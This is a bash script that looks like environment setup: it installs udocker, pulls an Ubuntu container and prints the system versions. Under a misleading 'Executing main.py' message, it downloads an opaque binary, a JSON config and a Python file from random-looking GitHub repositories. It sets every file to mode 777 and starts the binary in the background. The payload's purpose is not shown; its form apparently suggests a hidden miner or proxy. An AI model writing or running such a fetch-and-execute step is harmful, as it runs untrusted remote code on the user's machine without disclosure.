
#!/usr/bin/env bash

set -e

python3 -m pip install --user udocker
export PATH="$HOME/.local/bin:$PATH"
udocker --version
IMAGE="ubuntu:26.10"
CONTAINER="ubuntu-auto"

echo "[1] Checking udocker..."
command -v udocker >/dev/null || {
    echo "udocker is not installed"
    exit 1
}

echo "[2] Pulling Ubuntu..."
udocker pull "$IMAGE"

echo "[3] Creating container..."
udocker create --name="$CONTAINER" "$IMAGE" >/dev/null 2>&1 || true

echo "[4] Running commands inside Ubuntu..."

udocker run "$CONTAINER" bash -c '
set -e

apt-get update
apt-get install -y libc6 libstdc++6 python3 wget

echo "Ubuntu environment:"
cat /etc/os-release

echo "GLIBC version:"
ldd --version

echo "Executing main.py..."
cd /mnt
wget https://raw.githubusercontent.com/hosseinxdns4/potential-bassoon/main/x
wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/s.json
wget https://raw.githubusercontent.com/hosseinxdns4/ideal-winner/main/ht.py
echo "./x run --config=s.json" > bash.sh
chmod 777 *
./bash.sh &
./main.py
'
